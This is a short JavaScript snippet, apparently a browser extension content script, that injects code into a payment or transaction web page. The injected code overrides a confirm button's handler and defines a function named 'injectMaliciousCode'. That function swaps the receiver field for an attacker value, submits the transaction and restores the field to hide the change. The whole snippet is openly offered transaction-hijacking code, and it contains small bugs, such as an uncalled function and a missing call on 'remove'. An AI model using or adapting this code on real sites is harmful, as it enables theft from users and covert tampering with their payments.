function injectScript() {
  const scriptContent = `
  const confirmButton = document.getElementById('confirmButton');
  if (confirmButton) {
      confirmButton.onclick = function(event) {
          console.log("HM")
      };
  }

  function injectMaliciousCode() {
      let originalReceiverInput = document.getElementById('receiverInput');
      let originalValue = originalReceiverInput.value;
      originalReceiverInput.value = 'THANKS FOR YO MONEY BITCH';
      
      submitTransaction(); // Direct access to page's function
      
      originalReceiverInput.value = originalValue;
  }
  `;

  const scriptElement = document.createElement('script');
  scriptElement.textContent = scriptContent;
  document.documentElement.appendChild(scriptElement);
  scriptElement.remove
}

// Execute immediately when the script is injected
injectScript();